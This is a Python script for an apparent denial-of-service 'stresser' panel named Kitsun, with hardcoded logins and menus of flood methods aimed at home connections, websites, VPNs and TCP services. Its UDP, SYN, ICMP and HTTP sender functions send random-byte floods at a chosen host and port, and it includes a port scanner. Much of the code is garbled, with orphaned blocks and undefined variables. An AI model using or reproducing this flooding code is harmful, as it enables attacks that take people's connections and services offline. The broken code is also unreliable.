#!/usr/bin/env python3
#-*- coding: utf-8 -*-
import sys
import socket
import time
import random
import threading
import getpass
import os

sys.stdout.write("\x1b]2;Ⲕ ι 𝜏 ട ᥙ ɳ\x07")
def modifications():
	print ("Contact Kaz The Net Is Currently Fucking U LEAVE")
	on_enter = input("Please press enter to leave")
	exit()
#column:65
home = """\033[m
╔══════════════════════════════════════════════════════╗
║            \033[90m HOME METHODS\033[90m             ║               
║══════════════════════════════════════════════════════║
║  \033[90mUDP   (IP) (PORT) (TIME) (METHOD)  \033[90m|\033[90m Mix ATTACK\033[90m    ║
║  \033[90mHOME  (IP) (PORT) (TIME) (METHOD)  \033[90m|\033[90m HOME ATTACK\033[90m   ║
║  \033[90mNuke (IP) (PORT) (TIME) (METHOD)  \033[90m|\033[90m Nuke Flood\033[90m   ║
║  \033[90mZAP (IP) (PORT) (TIME) (METHOD)  \033[90m|\033[90m HOME Zap\033[90m   ║
║  \033[90mRIP (IP) (PORT) (TIME) (METHOD)  \033[90m|\033[90m Home Flood\033[90m   ║
║  \033[90mSLAP (IP) (PORT) (TIME) (METHOD)  \033[90m|\033[90m HOME SLAP\033[90m 
║  \033[90mCHARGE (IP) (PORT) (TIME) (METHOD)  \033[90m|\033[90m HOME CHARGE\033[90m   ║
╚══════════════════════════════════════════════════════╝\033[90m
\033[90mWelcome To Kitsun
"""

Website = """\033[91m
╔══════════════════════════════════════════════════════╗
║                     \033[00mWebsite Methods\033[91m                     ║               
║══════════════════════════════════════════════════════║
║  \033[00mHTTPOFF (HOST) (PORT) (TIME) (METHOD)  \033[91m|\033[00m HTTPOFF Attack.\033[91m       ║
║  \033[00mHTTPSMACK (HOST) (PORT) (TIME) (METHOD)  \033[91m|\033[00m HTTPSMACK Attack.\033[91m       ║
║  \033[00mHTTPKILL (HOST) (PORT) (TIME) (METHOD) \033[91m|\033[00m HTTPKILL Attack.\033[91m      ║
║  \033[00mHTTPHANG (HOST) (PORT) (TIME) (METHOD) \033[91m|\033[00m HTTPHANG Attack.\033[91m
║  \033[00mHTTPRAPE (HOST) (PORT) (TIME) (METHOD)  \033[91m|\033[00m HTTPRAPE Attack.\033[91m
║  \033[00mHTTPLAG (HOST) (PORT) (TIME) (METHOD)  \033[91m|\033[00m HTTPLAG Attack.\033[91m
║  \033[00mHTTPCOAT (HOST) (PORT) (TIME) (METHOD)  \033[91m|\033[00m HTTPCOAT Attack.\033[91m
╚══════════════════════════════════════════════════════╝\033[00m
"""

Vpn = """\033[m
╔══════════════════════════════════════════════════════╗
║            \033[90m VPN METHODS\033[90m             ║               
║══════════════════════════════════════════════════════║
║  \033[90mVPNDOWN   (IP) (PORT) (TIME) (METHOD)  \033[90m|\033[90m Down ATTACK\033[90m    ║
║  \033[90mVPNOP  (IP) (PORT) (TIME) (METHOD)  \033[90m|\033[90m VPN ATTACK\033[90m   ║
║  \033[90mVPNKILL (IP) (PORT) (TIME) (METHOD)  \033[90m|\033[90m VPN Flood\033[90m   ║
║  \033[90mVPNRIP (IP) (PORT) (TIME) (METHOD)  \033[90m|\033[90m Secure RIP\033[90m   ║
║  \033[90mCOAT (IP) (PORT) (TIME) (METHOD)  \033[90m|\033[90m COAT Floodv1\033[90m
║  \033[90mVPNLAG (IP) (PORT) (TIME) (METHOD)  \033[90m|\033[90m VPNLAG Floodv3\033[90m
║  \033[90mVPNSMACK (IP) (PORT) (TIME) (METHOD)  \033[90m|\033[90m VPNSMACK Floodv2\033[90m
╚══════════════════════════════════════════════════════╝\033[90m
"""

TCP = """\033[91m
╔══════════════════════════════════════════════════════╗
║                     \033[00mTCP Methods\033[91m                     ║               
║══════════════════════════════════════════════════════║
║  \033[00mAH (HOST) (PORT) (TIME) (METHOD)  \033[91m|\033[00m AH Attack.\033[91m       ║
║  \033[00mACK (HOST) (PORT) (TIME) (METHOD)  \033[91m|\033[00m ACK Attack.\033[91m       ║
║  \033[00mSYN (HOST) (PORT) (TIME) (METHOD) \033[91m|\033[00m SYN Attack.\033[91m      ║
║  \033[00mFBMP (HOST) (PORT) (TIME) (METHOD) \033[91m|\033[00m FBMP Attack.\033[91m
║  \033[00mSERVER (HOST) (PORT) (TIME) (METHOD) \033[91m|\033[00m SERVER Attack.\033[91m 
║  \033[00mSERVERKILL (HOST) (PORT) (TIME) (METHOD) \033[91m|\033[00m SERVERv2 Attack.\033[91m      ║
╚══════════════════════════════════════════════════════╝\033[00m
"""

info = """\033[91m
╔══════════════════════════════════════════════════════╗
║                     \033[00mⲔ ι 𝜏 ട ᥙ ɳ Info\033[91m ║
║══════════════════════════════════════════════════════║
║ \033[00m[+] Updates ever 2 weeks or less.\033[91m    ║
║ \033[00m[+] Discord Orbits#4087.\033[91m             ║
║ \033[00m[+] More Stuff Coming Soon.\033[91m          ║
║ \033[00m[+] I Love U ~-_-~.\033[91m                  
╚══════════════════════════════════════════════════════╝\033[00m
"""

Commands = """\033[91m
╔══════════════════════════════════════════════════════╗
║                    \033[00mCommands\033[91m          ║
║══════════════════════════════════════════════════════║
║ \033[00mMethods \033[91m|\033[00m Shows Methods For Ⲕ ι 𝜏 ട ᥙ ɳ.\033[91m                 ║                     
║ \033[00mInfo    \033[91m|\033[00m Shows Ⲕ ι 𝜏 ട ᥙ ɳ Info.\033[91m                        ║
║ \033[00mClear   \033[91m|\033[00m Clears Ⲕ ι 𝜏 ട ᥙ ɳ.\033[91m                            ║
║ \033[00mExit    \033[91m|\033[00m Exit Out Of Ⲕ ι 𝜏 ട ᥙ ɳ.\033[91m                       ║
╚══════════════════════════════════════════════════════╝\033[00m
"""

Sus = """\033[91m
╔══════════════════════════════════════════════════════╗
║                    \033[00mSus\033[91m          ║               
║══════════════════════════════════════════════════════║          
║ \033[00mLove \033[91m|\033[00m Ⲕ ι 𝜏 ട ᥙ ɳ Loves U.\033[91m                         
║ \033[00mKitsun    \033[91m|\033[00m Ⲕ ι 𝜏 ട ᥙ ɳ Daddy.\033[91m  
║ \033[00mLook   \033[91m|\033[00m Ur Sus For Reading.\033[91m                       
║ \033[00mPapi    \033[91m|\033[00m Ur Ⲕ ι 𝜏 ട ᥙ ɳ Dad.\033[91m   
╚══════════════════════════════════════════════════════╝\033[00m  
"""                                                               
                                                
banner = """\033[1;00m
 
▒█░▄▀ 　 ░▀░ 　 ▀▀█▀▀ 　 █▀▀ 　 █░░█ 　 █▀▀▄ 
▒█▀▄░ 　 ▀█▀ 　 ░░█░░ 　 ▀▀█ 　 █░░█ 　 █░░█ 
▒█░▒█ 　 ▀▀▀ 　 ░░▀░░ 　 ▀▀▀ 　 ░▀▀▀ 　 ▀░░▀
🇰​​​​​ 🇮​​​​​ 🇹​​​​​ 🇸​​​​​ 🇺​​​​​ 🇳​​​​​                      
Owner ptv.kaz
Co-Owner Cxmpettive                      
"""


cookie = open(".Ⲕ ι 𝜏_cookie","w+")

fsubs = 0
tpings = 0
pscans = 0
liips = 0
tattacks = 0
uaid = 0
said = 0
iaid = 0
haid = 0
aid = 0
attack = True
http = True
udp = True
syn = True
icmp = True


def synsender(host, port, timer, punch):
	global said
	global syn
	global aid
	global tattacks
	timeout = time.time() + float(timer)
	sock = socket.socket (socket.AF_INET, socket.SOCK_RAW, socket.TCP_SYNCNT)

	said += 1
	tattacks += 1
	aid += 1
	while time.time() < timeout and Udp and attack:
		sock.sendto(punch, (host, int(port)))
	said -= 1
	aid -= 1

def udpsender(host, port, timer, punch):
	global uaid
	global udp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	
	uaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and udp and attack:
		sock.sendto(punch, (host, int(port)))
	uaid -= 1
	aid -= 1

def icmpsender(host, port, timer, punch):
	global iaid
	global icmp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and Nuke and attack:
		sock.sendto(punch, (host, int(port)))
	iaid -= 1
	aid -= 1

def httpsender(host, port, timer, punch):
	global haid
	global http
	global aid
	global tattacks

	timeout = time.time() + float(timer)

	haid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and Nuke and attack:
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.sendto(punch, (host, int(port)))
			sock.close()
		except socket.error:
			pass

	haid -= 1
	aid -= 1


def main():
	global fsubs
	global tpings
	global pscans
	global liips
	global tattacks
	global uaid
	global said
	global iaid
	global haid
	global aid
	global attack
	global dp
	global syn
	global icmp
	global http

	while True:
		sys.stdout.write("\x1b]2;Server (0) | Bot (0) | Owner ptv.kaz\x07")
		sin = input("\033[1;00m[\033[90m@Ⲕ ι 𝜏 ട ᥙ ɳ\033[1;00m]-\033[90m@Ⲕ ι 𝜏 ട ᥙ ɳ\033[00m ").lower()
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("clear")
			print (banner)
			main()
		elif sinput == "":
			print (help)
			main()
		elif sinput == "":
			main()
		elif sinput == "exit":
			exit()
            
			main()
		elif sinput == "methods":
			print (home)
			main()
		elif sinput == "method":
			print (home)
			main()

				try:
					sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
					sock.connect((ip, port))
					print ("[\033[91mSIN\033[00m] {}\033[91m:\033[00m{} [\033[91mOPEN\033[00m]".format (ip, port))
					sock.close()
				except socket.error:
					return
				except KeyboardInterrupt:
					print ("\n")
			for port in range(1, port_range+1):
				ip = socket.gethostbyname(sin.split(" ")[1])
				threading.Thread(target=scan, args=(port, ip)).start()
		elif sinput == "updates":
			print (updatenotes)
			main()
		elif sinput == "infoer123":
			print (info)
			main()
            
			main()
		elif sinput == "dnsresolve1231234":
			sfound = 0
			sys.stdout.write("\x1b]2;Ⲕ ι 𝜏 ട ᥙ ɳ |{}| F O U N D\x07".format (sfound))
			
						pass
						#print ("[\033[91mⲔ ι 𝜏 \033[00m] Domain: {} [\033[91mNON-EXISTANT\033[00m]".format(url))
				print ("[\033[91mⲔ ι 𝜏 \033[00m] Task complete | found: {}".format(sfound))
				main()
			except IndexError:
				print ('ADD THE HOST!')
		elif sinput == "resolveer12331333":
			liips += 1
			host = sin.split(" ")[1]
			host_ip = socket.gethostbyname(host)
			print ("[\033[91mⲔ ι 𝜏 \033[00m] Host: {} \033[00m[\033[91mConverted\033[00m] {}".format (host, host_ip))
			main()
	
					try:
						sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
						sock.settimeout(2)
						start = time.time() * 1000
						sock.connect ((host, int(port)))
						stop = int(time.time() * 1000 - start)
						sys.stdout.write("\x1b]2;90m@Ⲕ ι 𝜏 \x07".format (stop))
						print ("Ⲕ ι 𝜏 ട ᥙ ɳ: {}:{} | Time: {}ms [\033[91mUP\033[00m]".format(ip, port, stop))
						sock.close()
						time.sleep(1)
					except socket.error:
						sys.stdout.write("\x1b]2;90m@Ⲕ ι 𝜏 ട ᥙ ɳ\x07")
						print ("Ⲕ ι 𝜏 ട ᥙ ɳ: {}:{} [\033[91mDOWN\033[00m]".format(ip, port))
						time.sleep(1)
					except KeyboardInterrupt:
						print("")
						main()
			except ValueError:
				print ("[\033[90m@Ⲕ ι 𝜏 ട ᥙ ɳ\033[00m] The command {} requires an argument".format (sinput))
				main()
		elif sinput == "udp":
			if username == "guests":
				print ("[\033[90m@Ⲕ ι 𝜏 ട ᥙ ɳ\033[00m] You are allowed to use this method")
				main()
			else:
				try:
					sinput, host, port, timer, pack = sin.split(" ")
					socket.gethostbyname(host)
					print ("Attack Launched".format (host))
					punch = random._urandom(int(pack))
					threading.Thread(target=udpsender, args=(host, port, timer, punch)).start()
				except ValueError:
					print ("[\033[90m@Ⲕ ι 𝜏 ട ᥙ ɳ\033[00m] The command {} requires an argument".format (sinput))
					main()
				except socket.gaierror:
					print ("[\033[90m@Ⲕ ι 𝜏 ട ᥙ ɳ\033[00m] Host: {} invalid".format (host))
					main()
		elif sinput == "home":
			try:
				sinput, host, port, timer, pack = sin.split(" ")
				socket.gethostbyname(host)
				print ("Ⲕ ι 𝜏 ട ᥙ ɳ Launched".format (host))
				punch = random._urandom(int(pack))
				threading.Thread(target=icmpsender, args=(host, port, timer, punch)).start()
			except ValueError:
				print ("[\033[90m@Ⲕ ι 𝜏 ട ᥙ ɳ\033[00m] The command {} requires an argument".format (sinput))
				main()
			except socket.gaierror:
				print ("[\033[90m@Ⲕ ι 𝜏 ട ᥙ ɳ\033[00m] Host: {} invalid".format (host))
				main()
		elif sinput == "essyn":
			if username == "guests":
				print ("[\033[90m@Ⲕ ι 𝜏 ട ᥙ ɳ\033[00m] You are allowed to use this method")
				main()
			else:
				try:
					sinput, host, port, timer, pack = sin.split(" ")
					socket.gethostbyname(host)
					print ("Ⲕ ι 𝜏 ട ᥙ ɳ Launched".format (host))
					punch = random._urandom(int(pack))
					threading.Thread(target=synsender, args=(host, port, timer, punch)).start()
				except ValueError:
					print ("[\033[90m@Ⲕ ι 𝜏 ട ᥙ ɳ\033[00m] The command {} requires an argument".format (sinput))
					main()
				except socket.gaierror:
					print ("[\033[90m@Ⲕ ι 𝜏 ട ᥙ ɳ\033[00m] Host: {} invalid".format (host))
					main()
		elif sinput == "zap":
			try:
				sinput, host, port, timer, pack = sin.split(" ")
				socket.gethostbyname(host)
				print ("Attack Launched".format (host))
				punch = random._urandom(int(pack))
				threading.Thread(target=icmpsender, args=(host, port, timer, punch)).start()
			except ValueError:
				print ("[\033[90m@Ⲕ ι 𝜏 ട ᥙ ɳ\033[00m] The command {} requires an argument".format (sinput))
				main()
			except socket.gaierror:
				print ("[\033[90m@Ⲕ ι 𝜏 ട ᥙ ɳ\033[00m] Host: {} invalid".format (host))
				main()
		elif sinput == "stopattacks":
			attack = False
			while not attack:
				if aid == 0:
					attack = True
		elif sinput == "stop":
			what = sin.split(" ")[1]
			if what == "udp":
				print ("Stoping all udp attacks")
				udp = False
				while not udp:
					if aid == 0:
						print ("[\033[91mⲔ ι 𝜏 \033[00m] No udp Processes running.")
						udp = True
						main()
			if what == "icmp":
				print ("Stopping all Nuke attacks")
				icmp = False
				while not nuke:
					print ("[\033[91m@Ⲕ ι 𝜏 ട ᥙ ɳ\033[00m] No Nuke processes running")
					udp = True
					main()
		else:
			print ("[\033[91m@Ⲕ ι 𝜏 ട ᥙ ɳ\033[00m] {} Not a command".format(sinput))
			main()



try:
	users = ["Ace", "guests"]
	clear = "clear"
	os.system (clear)
	username = getpass.getpass ("[+] Username (Enter Username): ")
	if username in users:
		user = username
	else:
		print ("Login Incorrect")
		exit()
except KeyboardInterrupt:
	print ("\nCTRL-C Pressed")
	exit()
try:
	passwords = ["OrbitsKaz", "gayman"]
	password = getpass.getpass ("[+] Password (Enter Password): ")
	if user == "Ace":
		if password == passwords[0]:
			print ("Login Successful")
			cookie.write("DIE")
			time.sleep(2)
			os.system (clear)
			try:
				os.system ("clear")
				print (banner)
				main()
			except KeyboardInterrupt:
				print ("\n[\033[90m@Ⲕ ι 𝜏 ട ᥙ ɳ\033[00m] CTRL has been pressed")
				main()
		else:
			print ("Login Incorrect")
			exit()
	if user == "guests":
		if password == passwords[1]:
			print ("[+] Login correct")
			print ("[+] Certain methods will not be available to you")
			time.sleep(4)
			os.system (clear)
			try:
				os.system ("clear")
				print (banner)
				main()
			except KeyboardInterrupt:
				print ("\n[\033[91mⲔ ι 𝜏 \033[00m] CTRL has been pressed")
				main()
		else:
			print ("[+] Incorrect, exiting")
			exit()
except KeyboardInterrupt:
	exit()